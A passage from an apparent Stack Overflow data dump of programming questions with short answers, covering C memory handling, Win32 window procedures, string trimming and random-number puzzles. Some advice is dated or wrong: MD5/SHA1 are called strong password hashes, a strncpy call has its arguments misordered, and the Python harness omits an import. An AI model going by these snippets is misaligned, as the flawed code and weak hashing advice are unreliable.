        string value = lookupInternal(key);

        lastKey = key;
        lastValue = value;

        return value;
    }

private:
    mutable string lastKey, lastValue;
};</pre>

<p>And then you can have a <code>const HashTable</code> object still use its <code>lookup()</code> method, which modifies the internal cache.</p>
"
"<p>I want to be able to figure out what port a particular program is using.  Are there any programs available online or that come with windows that will tell me which processes are using which ports on my computer?</p>

<p>PS - before you downmod this for not being a programming question, I'm looking for the program to test some networking code.</p>
","9530","Adam Rosenfield","<p>Windows comes with the <code>netstat</code> utility, which should do exactly what you want.</p>
"
"<p>I'm having some issues with producing an int matrix without creating memory leaks. I want to be able to make a given (global) matrix into any size dynamically via read_matrix(). But then i want to be able to free the memory later on. So in my main method the second printf should result in a bus error since it should not have any memory allocated to it. How would i go about creating this?</p>

<pre><code>int**   	first_matrix;
int**   	second_matrix;
int**   	result_matrix;

int** read_matrix(int size_x, int size_y)
{
    int** matrix;
    matrix = calloc(size_x, sizeof(int*));
    for(int i = 0;i&lt;size_x;i++) {
    	matrix[i] = calloc(size_y, sizeof(int));
    }
    for(int i = 0;i&lt;size_x;i++) {
    	for(int j = 0;j&lt;size_y;j++) {
    		matrix[i][j] = i*10+j;
    	}
    }
    return matrix;
}

int main(int stackc, char** stack)
{
    first_matrix = read_matrix(10,10);
    printf(""9:3 %d - 4:6 %d \n"", first_matrix[9][3], first_matrix[4][6]);
    free(*first_matrix);
    free(first_matrix);
    printf(""9:3 %d - 4:6 %d \n"", first_matrix[9][3], first_matrix[4][6]);
}
</code></pre>
","9530","Adam Rosenfield","<p>You need to free each row individually:</p>

<pre><code>
void free_matrix(int **matrix, int size_x)
{
    for(int i = 0; i &lt; size_x; i++)
        free(matrix[i]);
    free(matrix);
}
</code></pre>
"
"<p>While working on a tool that allows to exchange images of several third-party applications and thus creating individual ""skins"" for those applications, I have stumbled across a jpg-format about which I cannot seem to find any decent informations.</p>

<p>When looking at it in a hex-editor, it starts with the tag ""CF10"". Searching the internet has only provided a tool that is able to handle these kind of files, without any additional informations.</p>

<p>Does anyone have any further informations about this type of jpg-format?</p>
","9530","Adam Rosenfield","<p><a href=""http://linux.die.net/man/1/file"" rel=""nofollow""><code>file(1)</code></a> should give you some useful information.  You can also use ImageMagick's <a href=""http://www.imagemagick.org/script/identify.php"" rel=""nofollow""><code>identify(1)</code></a> program (optionally with the <code>-verbose</code> option) to get even more details about the file.  See the example on that page for a good idea of what information it provides.</p>
"
"<p>If I create a test suite for a development project, should those classes be kept under version control with the rest of the project code?</p>
","9530","Adam Rosenfield","<p>Yes, there is no reason not to put them in source control.  What if the tests change?  What if the interfaces change, necessitating that the tests change?</p>
"
"<p>I`d like to be able to read the content of office documents (for a custom crawler). </p>

<p>The office version that need to be readable are from 2000 to 2007. I mainly want to be crawling words, excel and powerpoint documents.</p>

<p>I don`t want to retrieve the formatting, only the text in it. </p>

<p>The crawler is based on lucene.NET if that can be of some help and is in c#.</p>

<p>I already used iTextSharp for parsing PDF</p>
","9530","Adam Rosenfield","<p><a href=""http://www.linux.com/feature/52385"" rel=""nofollow"">Here</a> is a good list of various tools for converting Word documents to plaintext, which you can then do whatever with.</p>
"
"<p>I am tasked with writing an authentication component for an open source JAVA app.  We have an in-house authentication widget that uses https.  I have some example php code that accesses the widget which uses cURL to handle the transfer.  </p>

<p>My question is whether or not there is a port of cURL to JAVA, or better yet, what base package will get me close enough to handle the task? </p>

<p><strong>Update</strong>:</p>

<p>This is in a nutshell, the code I would like to replicate in JAVA:</p>

<pre><code>$cp = curl_init();
$my_url = ""https://"" . AUTH_SERVER . ""/auth/authenticate.asp?pt1=$uname&amp;pt2=$pass&amp;pt4=full"";
curl_setopt($cp, CURLOPT_URL, $my_url);
curl_setopt($cp, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($cp);
curl_close($cp);
</code></pre>

<p><a href=""http://stackoverflow.com/questions/116650/curl-equivalent-in-java#116725"">Heath</a>, I think you're on the right track, I think I'm going to end up using HttpsURLConnection and then picking out what I need from the response.</p>
","9530","Adam Rosenfield","<p>You can try the libcurl Java bindings: <a href=""http://curl.haxx.se/libcurl/java/"" rel=""nofollow"">http://curl.haxx.se/libcurl/java/</a>.</p>
"
"<p>Is there <em>anything</em> available that isn't trivially breakable?</p>
","9530","Adam Rosenfield","<p>Use a strong crytographic hash function like MD5 or SHA1, but make sure you use a good <a href=""http://en.wikipedia.org/wiki/Salt_(cryptography)"" rel=""nofollow"">salt</a>, otherwise you'll be susceptible to <a href=""http://en.wikipedia.org/wiki/Rainbow_table"" rel=""nofollow"">rainbow table</a> attacks.</p>
"
"<p>It's gotta be free.  It's hobby, after all, not a business!. Creating for-profit software isn't an issue, but anything that requires a hardware mod is out.</p>
","9530","Adam Rosenfield","<p>No, all of the major consoles, except for the Xbox 360, do not have open development environments.  There are various homebrew kits you can get, but these aren't sanctioned by the console makers (Nintendo, Sony, and Microsoft), so at best, you'll only be able to give away ROMs of what you make for free.  If you try to sell anything, you'll get sued into the ground.</p>
"
"<p>I'm working on a C++ application that needs detailed timing information, down to the millisecond level.  </p>

<p>We intend to gather the time to second accuracy using the standard time() function in <code>&lt;ctime&gt;</code>.  We would like to additionally gather the milliseconds elapsed since the last second given by time().  </p>

<p>Does anyone know a convenient method for obtaining this information? </p>
","9530","Adam Rosenfield","<p>There is not a portable solution to this problem, since ANSI C does not define a standard millisecond-accurate time function.  If you're using Windows, you can use GetTickCount(), timeGetTime(), or QueryPerformanceCounter()/QueryPerformanceFrequency().  Keep in mind that these have different accuracies and different runtime costs.</p>

<p>There are other similar functions in other operating systems; I'm not sure what they are off the top of my head.</p>
"
"<p>I have this C-code to do multiplications over GF(8):</p>

<pre><code>int32_t GaloisMultiply (int32_t a, int32_t b) 
{
    int32_t i;
    int32_t mask = 0x100;
    int32_t y = 0;

    for(i=0;i&lt;8;i++) 
    {
        if(b &amp; mask) 
        {
            y ^= a;
        }
        mask &gt;&gt;= 1;
        y &lt;&lt;= 1;
    }

    if(b &amp; 0x1) 
    {
        y ^= a;
    }

    return(y);
}
</code></pre>

<p>That's more or less the text-book implementation.</p>

<p>I wonder if I there is a clever optimization for above algorithm if I can assert that a is always b, e.g. I do squaring instead of multiplication. I'm not after a cryptographic use btw. I just want to make use of the fact that x*x in GF(8) interleaves the bits of x with zero bits one by one.</p>

<p>There are already quite clever methods to do the bit interleaving, but since I've found out that x*x in GF(8) does the bit interleaving thing (by accident) I can't stop trying to use it for bit-interleaving optimizations.</p>

<p>Any ideas?</p>
","9530","Adam Rosenfield","<p>You could probably write some assembly to do a slightly better job.  However, I'd be pretty surprised if this was the bottleneck in your application; have you done any profiling?  This function doesn't seem like it's worth optimizing.</p>
"
"<p>I'm interested to know the best / common way of storing a this pointer for use in the WndProc. I know of several approaches, but each as I understand it have their own drawbacks. My questions are:</p>

<p>What different ways are there of producing this kind of code:</p>

<pre><code>CWindow::WndProc(UINT msg, WPARAM wParam, LPARAM)
{
  this-&gt;DoSomething();
}
</code></pre>

<p>I can think of Thunks, HashMaps, Thread Local Storage and the Window User Data struct.</p>

<p>What are the pros / cons of each of these approaches?</p>

<p>Points awarded for code examples and recommendations.</p>

<p>This is purely for curiosities sake. After using MFC I've just been wondering how that works and then got to thinking about ATL etc.</p>

<p><strong>Edit:</strong> What is the earliest place I can validly use the HWND in the window proc? It is documented as WM_NCCREATE - but if you actually experiment, that's <em>not</em> the first message to be sent to a window.</p>

<p><strong>Edit:</strong> ATL uses a thunk for accessing the this pointer. MFC uses a hashtable lookup of HWNDs.</p>
","9530","Adam Rosenfield","<p>You should use GetWindowLongPtr()/SetWindowLongPtr() (or the deprecated GetWindowLong()/SetWindowLong()).  They are fast and do exactly what you want to do.  The only tricky part is figuring out when to call SetWindowLongPtr() - you need to do this when the first window message is sent, which is WM_NCCREATE.  See <a href=""http://www.gamedev.net/reference/articles/article1810.asp"">this article</a> for sample code and a more in-depth discussion.</p>

<p>Thread-local storage is a bad idea, since you may have multiple windows running in one thread.</p>

<p>A hash map would also work, but computing the hash function for every window message (and there are a LOT) can get expensive.</p>

<p>I'm not sure how you mean to use thunks; how are you passing around the thunks?</p>
"
"<p>What is the best (cleanest, most efficient) way to write saturating addition in C?</p>

<p>The function or macro should add two unsigned inputs (need both 16- and 32-bit versions) and return all-bits-one (0xFFFF or 0xFFFFFFFF) if the sum overflows.</p>

<p>Target is x86 and ARM using gcc (4.1.2) and Visual Studio (for simulation only, so a fallback implementation is OK there).</p>
","9530","Adam Rosenfield","<p>I'm not sure if this is faster than Skizz's solution (always profile), but here's an alternative no-branch assembly solution.  Note that this requires the conditional move (CMOV) instruction, which I'm not sure is available on your target.</p>

<pre><code>
uint32_t sadd32(uint32_t a, uint32_t b)
{
    __asm
    {
    	movl eax, a
    	addl eax, b
    	movl edx, 0xffffffff
    	cmovc eax, edx
    }
}
</code></pre>
"
"<p>I have a bunch (hundreds) of files that are supposed to have Unix line endings. I strongly suspect that some of them have Windows line endings, and I want to programmatically figure out which ones do.</p>

<p>I know I can just run <pre>flip -u</pre> or something similar in a script to convert everything, but I want to be able to identify those files that need changing first.</p>
","9530","Adam Rosenfield","<p>You can use the <a href=""http://en.wikipedia.org/wiki/File_(Unix)""><code>file</code></a> tool, which will tell you the type of line ending.  Or, you could just use <code>dos2unix -U</code> which will convert everything to Unix line endings, regardless of what it started with.</p>
"
"<p>I'm not asking about general syntactic rules for file names. I mean gotchas that jump out of nowhere and bite you. For example, trying to name a file ""COM&lt;n&gt;"" on Windows?</p>
","9530","Adam Rosenfield","<p>Full description of legal and illegal filenames on Windows: <a href=""http://msdn.microsoft.com/en-us/library/aa365247.aspx"">http://msdn.microsoft.com/en-us/library/aa365247.aspx</a></p>
"
"<p>Do any C++ GNU standalone classes exist which handle paths cross platform?  My applications build on Windows and LInux.  Our configuration files refer to another file in a seperate directory.  I'd like to be able to read the path for the other configuration file into a class which would work on both Linux or Windows.</p>

<p>Which class would offer the smallest footprint to translate paths to use on either system?  Thanks</p>
","9530","Adam Rosenfield","<p>Unless you're using absolute paths, there's no need to translate at all - Windows automatically converts forward slashes into backslashes, so if you use relative paths with forward slash path separators, you'll be golden. You should really avoid absolute paths if at all possible.</p>
"
"<p>Is there a clean, preferably standard method of trimming leading and trailing whitespace from a string in C? I'd roll my own, but I would think this is a common problem with an equally common solution.</p>
","9530","Adam Rosenfield","<p>If you can modify the string:</p>

<pre><code>// Note: This function returns a pointer to a substring of the original string.
// If the given string was allocated dynamically, the caller must not overwrite
// that pointer with the returned value, since the original pointer must be
// deallocated using the same allocator with which it was allocated.  The return
// value must NOT be deallocated using free() etc.
char *trimwhitespace(char *str)
{
  char *end;

  // Trim leading space
  while(isspace(*str)) str++;

  if(*str == 0)  // All spaces?
    return str;

  // Trim trailing space
  end = str + strlen(str) - 1;
  while(end &gt; str &amp;&amp; isspace(*end)) end--;

  // Write new null terminator
  *(end+1) = 0;

  return str;
}
</code></pre>

<p>If you can't modify the string, then you can use basically the same method:</p>

<pre><code>// Stores the trimmed input string into the given output buffer, which must be
// large enough to store the result.  If it is too small, the output is
// truncated.
size_t trimwhitespace(char *out, size_t len, const char *str)
{
  if(len == 0)
    return 0;

  const char *end;
  size_t out_size;

  // Trim leading space
  while(isspace(*str)) str++;

  if(*str == 0)  // All spaces?
  {
    *out = 0;
    return 1;
  }

  // Trim trailing space
  end = str + strlen(str) - 1;
  while(end &gt; str &amp;&amp; isspace(*end)) end--;
  end++;

  // Set output size to minimum of trimmed string length and buffer size minus 1
  out_size = (end - str) &lt; len-1 ? (end - str) : len-1;

  // Copy trimmed string and add null terminator
  memcpy(out, str, out_size);
  out[out_size] = 0;

  return out_size;
}
</code></pre>
"
"<p>OK, I have been working on a random image selector and queue system (so you don't see the same images too often).</p>

<p>All was going swimmingly (as far as my crappy code does) <strong>until</strong> I got to the random bit. I wanted to test it, but how do you test for it? There is no <code>Debug.Assert(i.IsRandom)</code> (sadly) :D</p>

<p>So, I got my brain on it after watering it with some tea and came up with the following, I was just wondering if I could have your thoughts?</p>

<ul>
<li>Basically I knew the <strong>random</strong> bit was the problem, so I ripped that out to a delegate (which would then be passed to the objects constructor).</li>
<li>I then created a class that pretty much performs the same logic as the <em>live</em> code, but remembers the value selected in a private variable.</li>
<li>I then threw that delegate to the live class and tested against that:</li>
</ul>

<p>i.e.</p>

<pre><code>Debug.Assert(myObj.RndVal == RndIntTester.ValuePassed);
</code></pre>

<p>But I couldn't help but think, <strong>was I wasting my time?</strong> I ran that through lots of iterations to see if it fell over at any time etc.</p>

<p>Do you think I was wasting my time with this? Or could I have got away with:</p>

<p><img src=""http://imgs.xkcd.com/comics/random_number.png"" alt=""Awesome Random Number Generator"" title="""" /></p>

<p><a href=""http://stackoverflow.com/questions/122741/testing-for-random-value-thoughts-on-this-approach#122765"">GateKiller's answer</a> reminded me of this:</p>

<p><img src=""http://www.random.org/analysis/dilbert.jpg"" alt=""Dilbert Random"" title="""" /></p>

<h2>Update to Clarify</h2>

<ul>
<li><strong>I should add that I basically never want to see the same result more than X number of times from a pool of Y size.</strong></li>
<li>The addition of the test container basically allowed me to see if any of the previously selected images were ""randomly"" selected.</li>
<li>I guess technically the thing here being tested in not the RNG (since I never wrote that code) but the fact that am I expecting <em>random</em> results from a limited pool, and I want to track them.</li>
</ul>
","9530","Adam Rosenfield","<p>It's impossible to test if a value is truly random or not.  The best you can do is perform the test some large number of times and test that you got an appropriate distribution, but  if the results are truly random, even this has a (very small) chance of failing.</p>

<p>If you're doing white box testing, and you know your random seed, then you can actually compute the expected result, but you may need a separate test to test the randomness of your RNG.</p>
"
"<p>I have a page in my desktop app, and I've implemented simple grab-and-pan.  It works great.</p>

<p>When you are panning in this way and you are release, the page stops dead where you dropped it.</p>

<p>I'd like it to continue slightly with some momentum, and stop eventually.  Rather like the 'throw' in the iPhone UI, I guess.</p>

<p>I'm not really chasing perfection, just a very crude simple sense of being able to 'throw' that page.</p>
","9530","Adam Rosenfield","<p>Just keep track of the current velocity of the page, in addition to its position.  When the user releases, set the velocity to the last amount by which you panned.  Then, in subsequent frames, continue panning by the current velocity, and decrease the current velocity by some fixed amount (in magnitude) until it reaches zero.</p>
"
"<p>So I've got some C code:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

/* putting one of the ""char*""s here causes a segfault */
void main() {
  char* path = ""/temp"";
  char* temp;
  strcpy(temp, path);
}
</code></pre>

<p>This compiles, runs, and behaves as it looks. However, if one or both of the character pointers is declared as global variable, strcpy results in a segmentation fault. Why does this happen? Evidently there's an error in my understanding of scope.</p>
","9530","Adam Rosenfield","<p>You're invoking undefined behavior, since you're not initializing the <code>temp</code> variable.  It points to a random location in memory, so your program <em>may</em> work, but most likely it will segfault.  You need to have your destination string be an array, or have it point to dynamic memory:</p>

<pre><code>// Make temp a static array of 256 chars
char temp[256];
strncpy(temp, 256, path);

// Or, use dynamic memory
char *temp = (char *)malloc(256);
strncpy(temp, 256, path);
</code></pre>

<p>Also, use <code>strncpy()</code> instead of <code>strcpy()</code> to avoid buffer overruns.</p>
"
"<p>I have a method that periodically (e.g. once in every 10 secs) try to connect to a server and read some data from it. The server might not be available all the time. If the server is not available the method throws an exception.</p>

<p>What would be the best way to implement a wrapper method that doesn't throw an exception except if the server wasn't available for at least one minute?</p>
","9530","Adam Rosenfield","<p>Keep track of when the last time you successfully reached the server was.  If the server throws an exception, catch it and compare to the last time you reached the server.  If that time is more than a minute, rethrow the exception.</p>
"
"<p>How do you do low low level sockets in C, example: actually sending a SYN.</p>
","9530","Adam Rosenfield","<p>You want to use <a href=""http://mixter.void.ru/rawip.html"" rel=""nofollow"">raw sockets</a>.  In *nix, you need to be root to be able to create raw sockets.  I'm not sure if it's possible in Windows.</p>
"
"<p>I have defined an interface in c++, i.e. a class containing only pure virtual functions.</p>

<p>I want to explicitly forbid users of the interface to delete the object through a pointer to the interface, so I declared a protected and non-virtual destructor for the interface, something like:</p>

<pre><code>class ITest{
public:
    virtual void doSomething() = 0;
protected:
    ~ITest(){}
};

void someFunction(ITest * test){
    test-&gt;doSomething(); // ok
    // deleting object is not allowed
    // delete test; 
}
</code></pre>

<p>The GNU compiler gives me a warning saying ""class 'ITest' has virtual functions but non-virtual destructor"".</p>

<p>Once the destructor is protected, what is the difference in having it virtual or non-virtual?</p>

<p>Do you think this warning can be safely ignored or silenced?</p>
","9530","Adam Rosenfield","<p>If you had code in one of <code>ITest</code>'s methods that tried to <code>delete</code> itself (a bad idea, but legal), the derived class's destructor wouldn't be called.  You should still make your destructor virtual, even if you never intend to delete a derived instance via a base-class pointer.</p>
"
"<p>I am writing a component that, given a ZIP file, needs to:</p>

<ol>
<li>Unzip the file.</li>
<li>Find a specific dll among the unzipped files.</li>
<li>Load that dll through reflection and invoke a method on it.</li>
</ol>

<p>I'd like to unit test this component.</p>

<p>I'm tempted to write code that deals directly with the file system:</p>

<pre><code>void DoIt()
{
   Zip.Unzip(theZipFile, ""C:\\foo\\Unzipped"");
   System.IO.File myDll = File.Open(""C:\\foo\\Unzipped\\SuperSecret.bar"");
   myDll.InvokeSomeSpecialMethod();
}
</code></pre>

<p>But folks often say, ""Don't write unit tests that rely on the file system, database, network, etc.""</p>

<p>If I were to write this in a unit-test friendly way, I suppose it would look like this:</p>

<pre><code>void DoIt(IZipper zipper, IFileSystem fileSystem, IDllRunner runner)
{
   string path = zipper.Unzip(theZipFile);
   IFakeFile file = fileSystem.Open(path);
   runner.Run(file);
}
</code></pre>

<p>Yay! Now it's testable; I can feed in test doubles (mocks) to the DoIt method. But at what cost? I've now had to define 3 new interfaces just to make this testable. And what, exactly, am I testing? I'm testing that my DoIt function properly interacts with its dependencies. It doesn't test that the zip file was unzipped properly, etc.</p>

<p>It doesn't feel like I'm testing functionality anymore. It feels like I'm just testing class interactions.</p>

<p><strong>My question is this</strong>: what's the proper way to unit test something that is dependent on the file system?</p>

<p><em>edit</em> I'm using .NET, but the concept could apply Java or native code too.</p>
","9530","Adam Rosenfield","<p>There's really nothing wrong with this, it's just a question of whether you call it a unit test or an integration test.  You just have to make sure that if you do interact with the file system, there are no unintended side effects.  Specifically, make sure that you clean up after youself -- delete any temporary files you created -- and that you don't accidentally overwrite an existing file that happened to have the same filename as a temporary file you were using.  Always use relative paths and not absolute paths.</p>

<p>It would also be a good idea to <code>chdir()</code> into a temporary directory before running your test, and <code>chdir()</code> back afterwards.</p>
"
"<p>I have recently been thinking about the difference between the two ways of defining an array:</p>

<ol>
<li><code>int[] array</code></li>
<li><code>int array[]</code></li>
</ol>

<p>Is there a difference? I haven't found anything in my Java book explaining this to me and googling the question isn't bringing me any closer.</p>
","9530","Adam Rosenfield","<p>There is one slight difference, if you happen to declare more than one variable in the same declaration:</p>

<pre><code>int[] a, b;  // Both a and b are arrays of type int
int c[], d;  // WARNING: c is an array, but d is just a regular int
</code></pre>

<p>Note that this is bad coding style, although the compiler will almost certainly catch your error the moment you try to use <code>d</code>.</p>
"
"<p>On the advice of a more experienced developer, I have always coded my web pages that require user input (form processing, database administration, etc.) as self-referential pages. For PHP pages, I set the action of the form to the <code>'PHP_SELF'</code> element of the <code>$_SERVER</code> predefined variable, and depending on the arguments that I pass the page logic determines which code block(s) to execute.</p>

<p>I like that all of the code is contained in one file, and not spread around to various result pages. The one issue I've found is that my stats parsing programs can't differentiate between the first view of the page, and subsequent views (e.g. when the form has been submitted). A long time ago, when I used CGI or CF to create the pages, I directed the user to a different result page, which showed very neatly how many times the form was actually used.</p>

<p>What is the best practice for these types of pages in web development? Are there other, more compelling reasons for using (or not using) self-referential pages?</p>
","9530","Adam Rosenfield","<p>You could use separate pages, and just have the results page include the form page.</p>
"
"<p>I usually use C++ stdlib map whenever I need to store some data associated with a specific type of value (a key value - e.g. a string or other object). The stdlib map implementation is based on trees which provides better performance (O(log n)) than the standard array or stdlib vector.</p>

<p>My questions is, do you know of any C++ ""standard"" hashtable implementation that provides even better performance (O(1))? Something similar to what is available in the Hashtable class from the Java API.</p>
","9530","Adam Rosenfield","<p>Visual Studio has the class <code>stdext::hash_map</code> in the header <code>&lt;hash_map&gt;</code>, and gcc has the class <code>__gnu_cxx::hash_map</code> in the same header.</p>
"
"<p>Is it possible to write a regular expression that matches a nested pattern that occurs an unknown number of times. For example, can a regular expression match an opening and closing brace when there are an unknown number of open closing braces nested within the outer braces.</p>

<p>For example:</p>

<pre><code>public MyMethod()
{
  if (test)
  {
    // More { }
  }

  // More { }
} // End
</code></pre>

<p>Should match:</p>

<pre><code>{
  if (test)
  {
    // More { }
  }

  // More { }
}
</code></pre>
","9530","Adam Rosenfield","<p>No.  You need a full-blown parser for this type of problem.</p>
"
"<p>Just a quick question.</p>

<p>I'm looking for a simple strip chart (aka. graphing) control similar to the windows task manager 'Performance' view.  And have found a few, but they all rely on MFC or .NET   :(</p>

<p>Am hoping that someone here might have or know where to get a simple strip chart Win32 control that is not MFC.</p>

<p>Thanks.</p>
","9530","Adam Rosenfield","<p>I don't think there is a standard one in the Win32 common controls library.  You'll either have to use someone else's widget library, or roll your own using GDI to draw the graphs.  It probably isn't too difficult to roll your own - just create a bitmap control, and set the image every time your data updates to a graph that you draw in memory.</p>
"
"<p>After making it through the major parts of an introductory Lisp book, I still couldn't understand what the special operator <code>(quote)</code> (or equivalent <code>'</code>) function does, yet this has been all over Lisp code that I've seen.  </p>

<p>What does it do?</p>
","9530","Adam Rosenfield","<p>It says ""don't evaluate me"".  For example, if you wanted to use a list as data, and not as code, you'd put a quote in front of it.  For example,</p>

<p><code>(print '(+ 3 4))</code> prints ""(+ 3 4)"", whereas
<code>(print (+ 3 4))</code> prints ""7""</p>
"
"<p>Given a function which produces a random integer in the range 1 to 5, write a function which produces a random integer in the range 1 to 7.</p>

<ol>
<li>What is a simple solution?</li>
<li>What is an effective solution to reduce memory usage or run on a slower CPU?</li>
</ol>
","9530","Adam Rosenfield","<p>There is no (exactly correct) solution which will run in a constant amount of time, since 1/7 is an infinite decimal in base 5.  One simple solution would be to use rejection sampling, e.g.:</p>

<pre><code>
int i;
do
{
  i = 5 * (rand5() - 1) + rand5();  // i is now uniformly random between 1 and 25
} while(i > 21);
// i is now uniformly random between 1 and 21
return i % 7 + 1;  // result is now uniformly random between 1 and 7
</code></pre>

<p>This has an expected runtime of 25/21 = 1.19 iterations of the loop, but there is an infinitesimally small probability of looping forever.</p>
"
"<p>Given a function which produces a random integer in the range 1 to 5, write a function which produces a random integer in the range 1 to 7.</p>

<ol>
<li>What is a simple solution?</li>
<li>What is an effective solution to reduce memory usage or run on a slower CPU?</li>
</ol>
","9530","","<p>I'd like to add another answer, in addition to <a href=""http://stackoverflow.com/questions/137783/given-a-function-which-produces-a-random-integer-in-the-range-1-to-5-write-a-fun/137809#137809"">my first answer</a>.  This answer attempts to minimize the number of calls to <code>rand5()</code> per call to <code>rand7()</code>, to maximize the usage of randomness.  That is, if you consider randomness to be a precious resource, we want to use as much of it as possible, without throwing away any random bits.  This answer also has some similarities with the logic presented in <a href=""http://stackoverflow.com/questions/137783/given-a-function-which-produces-a-random-integer-in-the-range-1-to-5-write-a-fun/842343#842343"">Ivan's answer</a>.</p>

<p>The <a href=""http://en.wikipedia.org/wiki/Entropy%5F%28information%5Ftheory%29"">entropy of a random variable</a> is a well-defined quantity.  For a random variable which takes on N states with equal probabilities (a uniform distribution), the entropy is log<sub>2</sub> N.  Thus, <code>rand5()</code> has approximately 2.32193 bits of entropy, and <code>rand7()</code> has about 2.80735 bits of entropy.  If we hope to maximize our use of randomness, we need to use all 2.32193 bits of entropy from each call to <code>rand5()</code>, and apply them to generating 2.80735 bits of entropy needed for each call to <code>rand7()</code>.  The fundamental limit, then, is that we can do no better than log(7)/log(5) = 1.20906 calls to <code>rand5()</code> per call to <code>rand7()</code>.</p>

<p><em>Side notes: all logarithms in this answer will be base 2 unless specified otherwise.  <code>rand5()</code> will be assumed to return numbers in the range [0, 4], and <code>rand7()</code> will be assumed to return numbers in the range [0, 6].  Adjusting the ranges to [1, 5] and [1, 7] respectively is trivial.</em></p>

<p>So how do we do it?  We generate an <em>infinitely precise</em> random real number between 0 and 1 (pretend for the moment that we could actually compute and store such an infinitely precise number -- we'll fix this later).  We can generate such a number by generating its digits in base 5: we pick the random number 0.<code>a</code><sub>1</sub><code>a</code><sub>2</sub><code>a</code><sub>3</sub>..., where each digit a<sub><code>i</code></sub> is chosen by a call to <code>rand5()</code>.  For example, if our RNG chose a<sub><code>i</code></sub> = 1 for all <code>i</code>, then ignoring the fact that that isn't very random, that would correspond to the real number 1/5 + 1/5<sup>2</sup> + 1/5<sup>3</sup> + ... = 1/4 (sum of a geometric series).</p>

<p>Ok, so we've picked a random real number between 0 and 1.  I now claim that such a random number is uniformly distributed.  Intuitively, this is easy to understand, since each digit was picked uniformly, and the number is infinitely precise.  However, a formal proof of this is somewhat more involved, since now we're dealing with a continuous distribution instead of a discrete distribution, so we need to prove that the probability that our number lies in an interval [<code>a</code>, <code>b</code>] equals the length of that interval, <code>b - a</code>.  The proof is left as an exercise for the reader =).</p>

<p>Now that we have a random real number selected uniformly from the range [0, 1], we need to convert it to a series of uniformly random numbers in the range [0, 6] to generate the output of <code>rand7()</code>.  How do we do this?  Just the reverse of what we just did -- we convert it to an infinitely precise decimal in base 7, and then each base 7 digit will correspond to one output of <code>rand7()</code>.</p>

<p>Taking the example from earlier, if our <code>rand5()</code> produces an infinite stream of 1's, then our random real number will be 1/4.  Converting 1/4 to base 7, we get the infinite decimal 0.15151515..., so we will produce as output 1, 5, 1, 5, 1, 5, etc.</p>

<p>Ok, so we have the main idea, but we have two problems left: we can't actually compute or store an infinitely precise real number, so how do we deal with only a finite portion of it?  Secondly, how do we actually convert it to base 7?</p>

<p>One way we can convert a number between 0 and 1 to base 7 is as follows:</p>

<ol>
<li>Multiply by 7</li>
<li>The integral part of the result is the next base 7 digit</li>
<li>Subtract off the integral part, leaving only the fractional part</li>
<li>Goto step 1</li>
</ol>

<p>To deal with the problem of infinite precision, we compute a partial result, and we also store an upper bound on what the result could be.  That is, suppose we've called <code>rand5()</code> twice and it returned 1 both times.  The number we've generated so far is 0.11 (base 5).  Whatever the rest of the infinite series of calls to <code>rand5()</code> produce, the random real number we're generating will never be larger than 0.12: it is always true that 0.11 ≤ 0.11xyz... &lt; 0.12.</p>

<p>So, keeping track of the current number so far, and the maximum value it could ever take, we convert <em>both</em> numbers to base 7.  If they agree on the first <code>k</code> digits, then we can safely output the next <code>k</code> digits -- regardless of what the infinite stream of base 5 digits are, they will never affect the next <code>k</code> digits of the base 7 representation!</p>

<p>And that's the algorithm -- to generate the next output of <code>rand7()</code>, we generate only as many digits of <code>rand5()</code> as we need to ensure that we know with certainty the value of the next digit in the conversion of the random real number to base 7.  Here is a Python implementation, with a test harness:</p>

<pre><code>import random

rand5_calls = 0
def rand5():
    global rand5_calls
    rand5_calls += 1
    return random.randint(0, 4)

def rand7_gen():
    state = 0
    pow5 = 1
    pow7 = 7
    while True:
        if state / pow5 == (state + pow7) / pow5:
            result = state / pow5
            state = (state - result * pow5) * 7
            pow7 *= 7
            yield result
        else:
            state = 5 * state + pow7 * rand5()
            pow5 *= 5

if __name__ == '__main__':
    r7 = rand7_gen()
    N = 10000
    x = list(next(r7) for i in range(N))
    distr = [x.count(i) for i in range(7)]
    expmean = N / 7.0
    expstddev = math.sqrt(N * (1.0/7.0) * (6.0/7.0))

    print '%d TRIALS' % N
    print 'Expected mean: %.1f' % expmean
    print 'Expected standard deviation: %.1f' % expstddev
    print
    print 'DISTRIBUTION:'
    for i in range(7):
        print '%d: %d   (%+.3f stddevs)' % (i, distr[i], (distr[i] - expmean) / expstddev)
    print
    print 'Calls to rand5: %d (average of %f per call to rand7)' % (rand5_calls, float(rand5_calls) / N)
</code></pre>

<p>Note that <code>rand7_gen()</code> returns a generator, since it has internal state involving the conversion of the number to base 7.  The test harness calls <code>next(r7)</code> 10000 times to produce 10000 random numbers, and then it measures their distribution.  Only integer math is used, so the results are exactly correct.</p>

<p>Also note that the numbers here get <em>very</em> big, <em>very</em> fast.  Powers of 5 and 7 grow quickly.  Hence, performance will start to degrade noticeably after generating lots of random numbers, due to bignum arithmetic.  But remember here, my goal was to maximize the usage of random bits, not to maximize performance (although that is a secondary goal).</p>

<p>In one run of this, I made 12091 calls to <code>rand5()</code> for 10000 calls to <code>rand7()</code>, achieving the minimum of log(7)/log(5) calls on average to 4 significant figures, and the resulting output was uniform.</p>

<p>In order to port this code to a language that doesn't have arbitrarily large integers built-in, you'll have to cap the values of <code>pow5</code> and <code>pow7</code> to the maximum value of your native integral type -- if they get too big, then reset everything and start over.  This will increase the average number of calls to <code>rand5()</code> per call to <code>rand7()</code> very slightly, but hopefully it shouldn't increase too much even for 32- or 64-bit integers. </p>
"
"<p>I'm wondering which languages support (or don't support) native multithreading, and perhaps get some details about the implementation.  Hopefully we can produce a complete overview of this specific functionality.</p>
","9530","Adam Rosenfield","<p>Older versions of C and C++ (namely, C89, C99, C++98, and C++03) have no support at all in the core language, although libraries such as POSIX threads are available for pretty much every platform in common user today.</p>

<p>The newest versions of C and C++, C11 and C++11, do have built-in threading support in the language, but it's an optional feature of C11, so implementations such as single-core embedded systems can choose not to support it while supporting the rest of C11 if they desire.</p>
"
"<p>The problem/comic in question: <a href=""http://xkcd.com/287/"" rel=""nofollow"">http://xkcd.com/287/</a></p>

<p><img src=""http://imgs.xkcd.com/comics/np_complete.png"" alt=""General solutions get you a 50% tip"" /></p>

<p>I'm not sure this is the best way to do it, but here's what I've come up with so far. I'm using CFML, but it should be readable by anyone.</p>

<pre><code>&lt;cffunction name=""testCombo"" returntype=""boolean""&gt;
    &lt;cfargument name=""currentCombo"" type=""string"" required=""true"" /&gt;
